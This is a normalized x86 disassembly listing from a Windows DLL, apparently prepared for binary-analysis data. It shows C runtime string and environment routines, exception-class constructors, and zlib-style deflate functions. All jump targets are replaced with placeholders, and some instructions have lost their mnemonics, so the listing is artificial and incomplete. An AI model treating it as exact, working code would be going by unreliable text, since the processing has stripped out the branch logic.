mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_10007d40
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_10007d40
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_1001045a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_1000a4c5
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_10010639
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_100105e1
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_10008cba
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_1001010e
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_1000c1f3
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_10008d46
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_1000c1f3
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_10008cba
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1000e840
inc eax
inc eax
push eax
call sub_10008cba
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_1000b3d0
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_10008d46
pop ecx
mov [ rw-data ] eax
sub_100105e1
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_100100cf
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_10010639
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_10008cba
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_10008c87
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_1000a5e1
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_100106a0
mov eax sub_1001a794
call sub_10008d90
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_10001da0
mov esi r--data
push esi
call sub_1000e840
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_100109b4
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_100106fa
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call sub_1000870c
pop esi
mov eax sub_1001a7a8
call sub_10008d90
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rw-data
call sub_10013d4c
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_10001da0
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_10001ba0
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_100106fa
mov eax sub_1001a7a8
call sub_10008d90
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] rw-data
call sub_10013d4c
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_10001da0
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_10001ba0
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_10010788
mov eax sub_1001a7bc
call sub_10008d90
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_10001da0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_10013dd3
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_100107e1
mov eax sub_1001a7d0
call sub_10008d90
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
mov [ ebp - 0x10 ] esi
call sub_10013d89
mov al [ ebx + 0xc ]
and [ ebp - 0x4 ] 0x0
add ebx 0xc
lea edi [ esi + 0xc ]
push 0x0
mov ecx edi
mov [ edi ] al
call sub_10001da0
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_10001ba0
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_1001083e
mov eax sub_1001a7e4
call sub_10008d90
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_10001da0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_10013dd3
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_1001087b
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_100108b4
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_1000870c
push esi
mov esi ecx
call sub_1001083e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_100108cc
mov eax sub_1001a7f8
call sub_10008d90
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_10001da0
mov esi r--data
push esi
call sub_1000e840
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_100109b4
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_100106fa
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call sub_1000870c
pop esi
sub_10010926
mov eax sub_1001a80c
call sub_10008d90
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_10001da0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_10013dd3
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_10010963
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_1001099c
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_1000870c
push esi
mov esi ecx
call sub_10010926
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_100109b4
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x1
mov esi ecx
push edi
call sub_10001e10
test al al
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x8
push edi
push [ esp + 0x10 ]
push [ esi + 0x4 ]
call sub_1000a190
mov eax [ esi + 0x4 ]
add esp 0xc
mov [ esi + 0x8 ] edi
and [ eax + edi ] 0x0
sub_10010a30
sub esp 0x38
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x44 ]
push ebx
mov ebx [ esp + 0x44 ]
push esi
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0x54 ]
mov [ esp + 0x14 ] edx
push 0x38
mov [ esp + 0xc ] eax
mov eax [ ebx ]
push rw-data
lea edx [ esp + 0x10 ]
push ecx
push edx
mov [ esp + 0x28 ] eax
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x40 ] 0x0
call sub_10010b00
add esp 0x10
test eax eax
jne r-xdata
pop esi
pop ebx
add esp 0x38
retn
lea eax [ esp + 0x8 ]
push 0x4
push eax
call sub_10010db0
mov esi eax
add esp 0x8
cmp esi 0x1
je r-xdata
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x8 ]
push eax
mov [ ebx ] edx
call sub_10011110
add esp 0x4
lea ecx [ esp + 0x8 ]
push ecx
call sub_10011110
add esp 0x4
mov eax 0xfffffffb
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebx
add esp 0x38
retn
sub_10010b00
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push 0x0
push 0x8
push 0xf
push 0x8
push edx
push eax
call sub_10010b30
add esp 0x20
retn
sub_10010b30
mov eax [ esp + 0x1c ]
push ebx
push ebp
xor edx edx
xor ebp ebp
push esi
cmp eax edx
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffa
pop ebx
retn
mov ecx [ rw-data ]
mov al [ eax ]
cmp al [ ecx ]
jne r-xdata
cmp [ esp + 0x30 ] 0x38
jne r-xdata
mov edi [ esp + 0x14 ]
cmp edi edx
jne r-xdata
mov eax [ edi + 0x20 ]
mov [ edi + 0x18 ] edx
cmp eax edx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
cmp [ edi + 0x24 ] edx
jne r-xdata
mov [ edi + 0x20 ] sub_10011e40
mov [ edi + 0x28 ] edx
mov ecx [ esp + 0x18 ]
cmp ecx 0xffffffff
jne r-xdata
mov [ edi + 0x24 ] sub_10011e60
mov ebx [ esp + 0x20 ]
cmp ebx edx
jge r-xdata
mov [ esp + 0x18 ] 0x6
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
cmp eax 0x1
jl r-xdata
mov ebp 0x1
neg ebx
cmp eax 0x9
jg r-xdata
cmp [ esp + 0x1c ] 0x8
jne r-xdata
cmp ebx 0x8
jl r-xdata
cmp ebx 0xf
jg r-xdata
cmp ecx edx
jl r-xdata
cmp ecx 0x9
jg r-xdata
mov eax [ esp + 0x28 ]
cmp eax edx
jl r-xdata
cmp eax 0x2
jg r-xdata
mov edx [ edi + 0x28 ]
push 0x16b8
push 0x1
push edx
call [ edi + 0x20 ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov [ edi + 0x1c ] esi
mov [ esi + 0x18 ] ebp
mov ebp 0x1
mov ecx ebx
shl ebp cl
mov [ esi + 0x28 ] ebx
mov ebx [ esp + 0x24 ]
mov [ esi ] edi
push 0x2
lea ecx [ ebx + 0x7 ]
mov [ esi + 0x48 ] ecx
mov [ esi + 0x24 ] ebp
lea eax [ ebp - 0x1 ]
push ebp
mov [ esi + 0x2c ] eax
mov eax 0x1
shl eax cl
add ecx 0x2
mov [ esi + 0x44 ] eax
dec eax
mov [ esi + 0x4c ] eax
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
mov [ esi + 0x50 ] edx
mov ecx [ edi + 0x28 ]
push ecx
call [ edi + 0x20 ]
mov edx [ esi + 0x24 ]
mov [ esi + 0x30 ] eax
mov eax [ edi + 0x28 ]
push 0x2
push edx
push eax
call [ edi + 0x20 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x38 ] eax
mov edx [ edi + 0x28 ]
push 0x2
push ecx
push edx
call [ edi + 0x20 ]
mov [ esi + 0x3c ] eax
lea ecx [ ebx + 0x6 ]
mov eax 0x1
push 0x4
shl eax cl
mov [ esi + 0x1694 ] eax
push eax
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov ecx [ esi + 0x1694 ]
add esp 0x30
mov [ esi + 0x8 ] eax
lea edx [ ecx * 4 ]
mov [ esi + 0xc ] edx
mov edx [ esi + 0x30 ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffc
pop ebx
retn
mov eax [ rw-data ]
push edi
mov [ edi + 0x18 ] eax
call sub_10011110
add esp 0x4
mov eax 0xfffffffc
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x38 ]
test edx edx
je r-xdata
mov edx [ esi + 0x3c ]
test edx edx
je r-xdata
test eax eax
je r-xdata
mov edx ecx
push edi
shr edx 0x1
mov [ esi + 0x1d ] 0x8
lea edx [ eax + edx * 2 ]
lea eax [ eax + ecx * 2 ]
add ecx eax
mov [ esi + 0x169c ] edx
mov edx [ esp + 0x2c ]
mov [ esi + 0x1690 ] ecx
mov ecx [ esp + 0x1c ]
mov [ esi + 0x80 ] edx
mov [ esi + 0x7c ] ecx
call sub_10010d30
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10010d30
mov eax [ esp + 0x4 ]
xor ecx ecx
cmp eax ecx
push esi
je r-xdata
mov eax 0xfffffffe
pop esi
retn
mov esi [ eax + 0x1c ]
cmp esi ecx
je r-xdata
cmp [ eax + 0x20 ] ecx
je r-xdata
cmp [ eax + 0x24 ] ecx
je r-xdata
mov [ eax + 0x14 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x2c ] 0x2
mov edx [ esi + 0x8 ]
mov [ esi + 0x14 ] ecx
mov [ esi + 0x10 ] edx
mov edx [ esi + 0x18 ]
cmp edx ecx
jge r-xdata
mov edx [ esi + 0x18 ]
push esi
neg edx
sbb edx edx
and edx 0x47
add edx 0x2a
mov [ esi + 0x4 ] edx
mov [ eax + 0x30 ] 0x1
mov [ esi + 0x20 ] ecx
call sub_10011fa0
push esi
call sub_100111c0
add esp 0x8
xor eax eax
pop esi
retn
mov [ esi + 0x18 ] ecx
sub_10010db0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
mov ebp [ esp + 0x18 ]
cmp ebp 0x4
jg r-xdata
test ebp ebp
jl r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov [ ebx + 0x18 ] edx
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x29a
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x10 ]
test ecx ecx
jne r-xdata
cmp ebp 0x4
jne r-xdata
mov ecx [ esi + 0x20 ]
cmp eax 0x2a
mov [ esi ] ebx
mov [ esp + 0x14 ] ecx
mov [ esi + 0x20 ] ebp
jne r-xdata
mov eax [ rw-data ]
pop edi
pop esi
mov [ ebx + 0x18 ] eax
pop ebp
mov eax 0xfffffffb
pop ebx
retn
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
mov eax [ esi + 0x7c ]
shl ecx 0xc
sub ecx 0x7800
dec eax
sar eax 0x1
cmp eax 0x3
jbe r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
push ebx
call sub_10011090
mov eax [ ebx + 0x10 ]
add esp 0x4
test eax eax
jne r-xdata
shl eax 0x6
or ecx eax
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax 0x3
mov eax [ esi + 0x4 ]
mov ecx [ ebx + 0x4 ]
cmp eax 0x29a
jne r-xdata
cmp ebp [ esp + 0x14 ]
jg r-xdata
mov [ esi + 0x20 ] 0xffffffff
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax ecx
xor edx edx
mov edi 0x1f
mov [ esi + 0x4 ] 0x71
div edi
sub ecx edx
add ecx edi
push ecx
push esi
call sub_10011060
mov eax [ esi + 0x64 ]
add esp 0x8
test eax eax
je r-xdata
or ecx 0x20
test ecx ecx
jne r-xdata
test ecx ecx
je r-xdata
cmp ebp 0x4
je r-xdata
mov [ ebx + 0x30 ] 0x1
mov edx [ ebx + 0x30 ]
shr edx 0x10
push edx
push esi
call sub_10011060
mov eax [ ebx + 0x30 ]
and eax 0xffff
push eax
push esi
call sub_10011060
add esp 0x10
mov eax [ esi + 0x7c ]
push ebp
push esi
lea eax [ eax + eax * 2 ]
call [ eax * 4 + r--data ]
add esp 0x8
cmp eax 0x2
je r-xdata
mov ecx [ esi + 0x6c ]
test ecx ecx
jne r-xdata
mov edx [ rw-data ]
pop edi
pop esi
mov [ ebx + 0x18 ] edx
pop ebp
mov eax 0xfffffffb
pop ebx
retn
mov ecx [ rw-data ]
pop edi
pop esi
mov [ ebx + 0x18 ] ecx
pop ebp
mov eax 0xfffffffb
pop ebx
retn
mov [ esi + 0x4 ] 0x29a
cmp eax 0x3
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
cmp eax 0x2
je r-xdata
test eax eax
je r-xdata
cmp ebp 0x4
je r-xdata
cmp eax 0x29a
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov [ esi + 0x20 ] 0xffffffff
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp ebp eax
jne r-xdata
mov eax [ ebx + 0x30 ]
shr eax 0x10
push eax
push esi
call sub_10011060
mov ecx [ ebx + 0x30 ]
and ecx 0xffff
push ecx
push esi
call sub_10011060
push ebx
call sub_10011090
mov ecx [ esi + 0x14 ]
add esp 0x14
mov [ esi + 0x18 ] 0xffffffff
xor eax eax
pop edi
pop esi
test ecx ecx
pop ebp
pop ebx
sete al
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push 0x0
push 0x0
push 0x0
push esi
call sub_10012090
add esp 0x10
cmp ebp 0x3
jne r-xdata
push esi
call sub_10012130
add esp 0x4
jmp r-xdata
push ebx
call sub_10011090
mov eax [ ebx + 0x10 ]
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x3c ]
mov [ edx + ecx * 2 - 0x2 ] 0x0
mov eax [ esi + 0x44 ]
mov edi [ esi + 0x3c ]
lea ecx [ eax + eax - 0x2 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx ebp
[ edi ]
mov [ esi + 0x20 ] 0xffffffff
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_10011060
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
push edi
mov esi [ eax + 0x8 ]
mov edi [ eax + 0x14 ]
mov edx ecx
shr edx 0x8
mov [ esi + edi ] dl
mov edx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
inc edx
mov [ eax + 0x14 ] edx
pop edi
mov [ esi + edx ] cl
mov ecx [ eax + 0x14 ]
inc ecx
pop esi
mov [ eax + 0x14 ] ecx
retn
sub_10011090
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax + 0x1c ]
mov ecx [ eax + 0x10 ]
mov edx [ esi + 0x14 ]
cmp edx ecx
jbe r-xdata
test edx edx
je r-xdata
mov edx ecx
pop esi
retn
mov esi [ esi + 0x10 ]
mov ecx edx
push ebx
mov ebx ecx
push edi
mov edi [ eax + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0xc ]
mov ecx [ eax + 0x1c ]
add edi edx
mov [ eax + 0xc ] edi
mov esi [ ecx + 0x10 ]
add esi edx
mov [ ecx + 0x10 ] esi
mov ebx [ eax + 0x14 ]
mov edi [ eax + 0x10 ]
mov ecx [ eax + 0x1c ]
add ebx edx
sub edi edx
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] edi
mov esi [ ecx + 0x14 ]
pop edi
sub esi edx
pop ebx
mov [ ecx + 0x14 ] esi
mov eax [ eax + 0x1c ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
sub_10011110
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov edi [ eax + 0x4 ]
cmp edi 0x2a
je r-xdata
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
cmp edi 0x71
je r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx + 0x3c ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0x28 ]
push eax
call [ esi + 0x24 ]
add esp 0x8
cmp edi 0x29a
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
mov edx [ esi + 0x28 ]
push eax
push edx
call [ esi + 0x24 ]
add esp 0x8
mov edx [ esi + 0x1c ]
mov eax [ edx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x28 ]
push ecx
push edx
call [ esi + 0x24 ]
add esp 0x8
xor eax eax
cmp edi 0x71
mov [ esi + 0x1c ] 0x0
setne al
dec eax
pop edi
and al 0xfd
pop esi
retn
push eax
mov eax [ esi + 0x28 ]
push eax
call [ esi + 0x24 ]
add esp 0x8
sub_100111c0
mov edx [ esp + 0x4 ]
push ebx
push esi
xor esi esi
mov eax [ edx + 0x24 ]
mov ecx [ edx + 0x44 ]
shl eax 0x1
mov [ edx + 0x34 ] eax
mov eax [ edx + 0x3c ]
push edi
mov [ eax + ecx * 2 - 0x2 ] si
mov ecx [ edx + 0x44 ]
mov edi [ edx + 0x3c ]
xor eax eax
lea ecx [ ecx + ecx - 0x2 ]
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov eax [ edx + 0x7c ]
xor ecx ecx
pop edi
lea eax [ eax + eax * 2 ]
shl eax 0x2
mov cx [ eax + r--data ]
mov [ edx + 0x78 ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x84 ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x88 ] ecx
xor ecx ecx
mov cx [ eax + r--data ]
mov [ edx + 0x64 ] esi
mov [ edx + 0x54 ] esi
mov [ edx + 0x6c ] esi
mov eax 0x2
mov [ edx + 0x60 ] esi
mov [ edx + 0x40 ] esi
pop esi
mov [ edx + 0x74 ] ecx
mov [ edx + 0x70 ] eax
mov [ edx + 0x58 ] eax
pop ebx
retn
sub_10011260
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov ebx 0xffff
mov eax [ esi + 0xc ]
add eax 0xfffffffb
cmp eax ebx
jae r-xdata
mov ebp [ esp + 0x14 ]
mov ebx eax
mov ecx [ esi + 0x64 ]
mov [ esi + 0x6c ] 0x0
add ecx eax
mov [ esi + 0x64 ] ecx
mov ecx [ esi + 0x54 ]
mov edx [ esi + 0x64 ]
lea eax [ ecx + ebx ]
je r-xdata
push esi
call sub_100113c0
mov eax [ esi + 0x6c ]
add esp 0x4
test eax eax
jne r-xdata
sub edx eax
mov [ esi + 0x64 ] eax
test ecx ecx
mov [ esi + 0x6c ] edx
jl r-xdata
cmp edx eax
jb r-xdata
test ebp ebp
je r-xdata
xor edx edx
mov edx [ esi + 0x30 ]
add edx ecx
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx ecx
sub eax 0x106
cmp edx eax
jb r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
test eax eax
je r-xdata
sub eax ecx
push 0x0
push eax
push edx
push esi
call sub_10012390
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_10011090
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x1
ja r-xdata
test ecx ecx
jl r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
jmp r-xdata
push 0x0
push edx
push eax
push esi
call sub_10012390
mov edx [ esi ]
mov ecx [ esi + 0x64 ]
push edx
mov [ esi + 0x54 ] ecx
call sub_10011090
mov eax [ esi ]
add esp 0x14
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov eax ebp
pop esi
sub eax 0x4
pop ebp
neg eax
sbb eax eax
pop ebx
and al 0xfe
add eax 0x3
retn
xor eax eax
cmp ebp 0x4
setne al
dec eax
pop esi
pop ebp
and eax 0x2
pop ebx
retn
xor edx edx
cmp ebp 0x4
sete dl
push edx
